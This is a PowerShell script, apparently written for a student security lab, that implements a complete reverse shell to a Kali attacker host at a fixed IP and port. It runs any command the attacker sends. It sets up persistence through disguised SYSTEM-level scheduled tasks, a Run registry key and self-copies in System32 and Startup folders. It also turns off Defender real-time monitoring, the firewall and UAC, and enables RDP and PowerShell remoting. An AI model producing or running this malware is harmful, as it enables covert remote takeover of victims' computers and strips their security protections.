#jimmy mcgovern
#reverse shell

#$scriptPath = "C:\Users\student\Documents\reverseShell.ps1"
$scriptPath = Join-Path -path $PSScriptRoot -ChildPath reverseShell.ps1

Start-Sleep -Seconds 15
#establishes connection to kali box
#.tcpClient takes string attackerip, portnumber
$client = New-Object System.Net.Sockets.TcpClient("10.1.0.8", 4444)
#gets the network stream in a readable/writeable form
$stream = $client.GetStream()
#sets up reader (reads data incoming from attacker)
$reader = New-Object System.IO.StreamReader($stream)
#sets up writer (sends data to attacker)
$writer = New-Object System.IO.StreamWriter($stream)
#all data is sent in real time
$writer.AutoFlush = $true
#sends the attacker a string formatted list of 
#all the commands the attacker can run    
$writer.WriteLine((Get-Command | Out-String))

$writer.WriteLine($scriptPath)

#initializing scheduledtask shit
$trigger = New-ScheduledTaskTrigger -AtLogOn
$trigger.Repetition = (New-ScheduledTaskTrigger -Once -At "12am" -RepetitionInterval (New-TimeSpan -Minutes 5)).repetition
$taskPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount:3
#bypass execution policy for the script
Set-ExecutionPolicy Bypass -Scope Process
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $scriptPath -Force"
Register-ScheduledTask -Action $action -Trigger $trigger -Principal $taskPrincipal -TaskName "windows_important_task" -Settings $settings -Force

#lowering security

#disable realtimemonitoring
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "Set-MpPreference -DisableRealTimeMonitoring $True"
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MpPreference" -Principal $taskPrincipal -Settings $settings -Force
#set executionPolicy to unrestricted
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "Set-ExecutionPolicy Unrestricted -Scope Process -Force"
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "executionPolicy" -Principal $taskPrincipal -Settings $settings -Force
#turn off firewall
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False -Force"
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Firewall" -Principal $taskPrincipal -Settings $settings -Force
#enable powershell remoting
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "Enable-PSRemoting -Force"
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsExecPSRemoting" -Principal $taskPrincipal -Settings $settings -Force
#enable rdp
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0"
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Firewall" -Principal $taskPrincipal -Settings $settings -Force
#disable UAC 
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0"
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Firewall" -Principal $taskPrincipal -Settings $settings -Force

$taskName = "windows_reverse_tool"

#duplicate self
if (-not (Test-Path -path "C:\Windows\System32\reverseShell.ps1")){
    Copy-Item -Path $scriptPath -Destination "C:\Windows\System32\reverseShell.ps1" -Force
}
#if (-not (Test-Path -path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverseShell.ps1")){
#    Copy-Item -Path $scriptPath -Destination "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverseShell.ps1" -Force
#}
$userName = (Get-WmiObject -Class Win32_ComputerSystem).UserName
if (-not (Test-Path -path "C:\Users\$userName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\reverseShell.ps1")){
    Copy-Item -Path $scriptPath -Destination "C:\Users\$userName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\reverseShell.ps1" -Force
}

#reruns the file every minute
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File $scriptPath"
$trigger.Repetition = (New-ScheduledTaskTrigger -Once -At "12am" -RepetitionInterval (New-TimeSpan -Minutes 1)).repetition
Register-ScheduledTask -Action $action -Trigger $trigger -Principal $taskPrincipal -TaskName "sheldon" -Settings $settings -Force
#makes sure the file is run every login
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "windowsImportantDawgWalking" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \Start-Process powershell.exe -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File $scriptPath -Verb RunAs\"

#infinite loop
while ($true) { 
   $writer.Write("PS C:\> ")
#wait for a command from attacker
   $command = $reader.ReadLine()
   if ($command -eq "exit"){
        break #exit the loop if attacker sends exit
   }

   try{
        #Disable confirmation prompts
        $ConfirmPreference = 'None' 
        #execute command and send back the output
        #2>&1 sends both standard output and errors
        $output = Invoke-Expression $command 2>&1
        $outputString = $output | Out-String
        $writer.WriteLine($outputString)

        
   }catch{
        #if there is an error, send that
        $writer.WriteLine("Error: $_")
   }
}
